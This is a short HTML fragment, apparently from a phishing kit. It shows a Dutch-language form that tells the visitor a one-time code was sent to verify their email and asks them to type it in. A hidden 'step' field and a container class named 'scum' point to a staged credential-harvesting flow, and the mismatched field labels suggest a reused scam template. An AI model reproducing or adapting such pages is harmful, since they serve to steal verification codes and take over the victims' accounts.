...
<input type="hidden" name="step"  value="emlll">
    <div id="sf-master">
...
<div class="login_flow scum" id="phone-view">
            ...
            <div class="form_fields form-group">
                <div class="form_labels"> 
                	<label for="mob"><span class="ng-binding">We hebben u een eenmalige code gestuurd om uw e-mailadres te verifiëren. Voer de door u verzonden code in het onderstaande veld in:
                ...
                <div class="form_details ">
                    ...
                    <div class="default_input_field"> 
                    	...
                    	<input type="text" name="eml" class="input_card_number form-control" data-err_text="gsm-nummer" placeholder="******" data-mask="99 99 99 99" mask-placeholder="-- -- -- --" required="">
                    </div>
                </div>
            </div>
